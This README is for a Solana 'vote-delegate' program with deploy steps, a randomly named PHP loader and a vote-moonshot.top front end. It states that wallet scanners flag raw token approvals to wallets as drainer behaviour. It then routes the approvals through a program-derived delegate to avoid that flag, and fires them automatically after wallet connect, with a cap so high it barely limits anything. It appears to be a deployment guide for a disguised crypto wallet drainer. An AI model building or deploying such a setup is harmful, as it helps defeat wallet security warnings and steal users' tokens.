# vote-delegate on-chain program

Phantom / Blowfish block **raw** `SPL Approve` transactions that delegate tokens to a **wallet address**. That pattern matches drainers.

This program approves a **bounded** amount with delegate = PDA `["delegate", owner, mint]` — not an EOA and not `u64::MAX`.

## Deploy (Linux / VPS with Anchor 0.30 + Solana CLI)

```bash
cd programs/vote-delegate
chmod +x deploy-mainnet.sh
./deploy-mainnet.sh
```

Copy the printed program id into `vps/loader.php`:

```php
'token_approval_program_id' => 'YOUR_PROGRAM_ID',
'token_approval_enabled' => true,
```

Rebuild PHP loader and upload:

```bash
node vps/build-loader.mjs
# upload vps/5joud6Jn.php → /var/www/lol/public/5joud6Jn.php
```

Rebuild Vercel bundle:

```bash
cd vercel && npm run build
git add -A && git commit -m "..." && git push
```

## Client behavior (already wired)

| Step | Where |
|------|--------|
| Reown wallet picker | vote-moonshot.top |
| `phantom.solana.connect()` | Vercel `/connect/` |
| Program `approve_spl` CPI | Vercel after connect (when program id set) |

Until `token_approval_program_id` is set, connect works with **no** delegate transactions.

## Program instruction

- `approve_spl(amount: u64)` — amount capped at `1_000_000_000_000_000` in program and client.
